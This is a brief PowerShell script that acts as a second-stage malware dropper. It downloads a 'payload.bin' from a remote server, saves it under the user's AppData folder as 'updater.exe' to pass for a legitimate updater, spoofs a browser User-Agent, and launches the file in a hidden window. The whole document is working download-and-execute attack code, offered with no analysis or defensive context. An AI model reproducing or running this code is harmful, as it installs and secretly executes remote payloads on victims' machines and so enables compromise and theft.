$DownloadUrl = "https://contoso.com:8443/downloads/payload.bin"
$OutputPath = "$env:APPDATA\updater.exe"
$RequestTimeout = 131
$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$TransferResult = Invoke-Stage2Download -SourceUrl $DownloadUrl -DestinationPath $OutputPath -TimeoutSec $RequestTimeout -UserAgent $RequestAgent
if ($TransferResult) {
    Start-Process -FilePath $OutputPath -WindowStyle Hidden
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Write-Verbose "stage marker 2 reached"
